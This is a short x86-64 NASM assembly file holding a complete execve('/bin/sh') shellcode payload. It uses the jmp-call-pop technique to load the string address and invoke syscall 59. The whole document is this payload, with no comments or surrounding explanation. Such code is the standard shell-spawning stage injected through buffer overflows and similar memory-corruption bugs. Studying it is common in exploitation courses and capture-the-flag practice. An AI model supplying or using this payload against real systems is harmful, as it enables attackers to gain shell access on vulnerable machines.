BITS 64
global _start

_start:
	xor rax, rax
	mov al, 59
	jmp buf

setebx:
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	syscall

buf:
	call setebx
	db '/bin/sh', 0
